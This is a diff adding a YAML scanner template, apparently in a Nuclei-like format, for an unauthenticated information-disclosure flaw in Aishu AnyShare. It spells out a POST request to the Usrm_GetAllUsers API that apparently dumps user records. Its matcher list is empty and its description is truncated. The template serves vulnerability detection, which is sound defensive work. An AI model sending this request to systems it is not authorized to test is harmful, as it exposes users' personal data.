@@ -1,0 +1,17 @@
+id: aishu-anyshare-info-exposure
+brief:
+    title: Aishu AnyShare - Information Disclosure
+    by: s4e-io
+    level: high
+    about: Aishu AnyShare intelligent content management platform Usrm_GetAllUsers interface has an information disclosure vulnerability, and unauthenticated attackers can obtain sensitive information such as...
+    label:
+        - aishu-anyshare
+        - info-leak
+        - disclosure
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/ShareMgnt/Usrm_GetAllUsers'
+      body: '[1,100]'
+      signs: []
